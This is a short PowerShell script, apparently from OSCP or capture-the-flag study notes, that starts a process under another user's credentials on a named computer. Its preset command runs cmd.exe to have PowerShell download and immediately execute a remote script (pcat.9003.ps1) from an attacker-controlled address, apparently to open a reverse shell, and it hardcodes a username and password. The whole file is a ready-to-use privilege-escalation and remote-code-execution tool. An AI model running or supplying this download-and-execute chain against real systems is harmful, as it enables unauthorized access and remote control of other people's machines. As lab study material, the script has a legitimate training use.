<#
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/06/26

execute command with user/password

when contain space chars, set like this:
    "`"hello world`""

ref: https://abcsup.gitbook.io/oscp-study-notes/privilege-escalation
#>

# change this {{{1
$user="ffake"
$password="p@ssw3rd135246"
$computer = "desktop-960p1c7"

$cmd="`"C:\Windows\System32\cmd.exe`""
$parameter="`"/C powershell iex(New-Object Net.webClient).downloadstring('http://10.10.14.4/chatterbox/pcat.9003.ps1')`""
#$parameter="<argument>"
# }}}


# create credential object
$secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)

[System.Diagnostics.Process]::Start($cmd, $parameter, $mycreds.Username, $mycreds.Password, $computer)

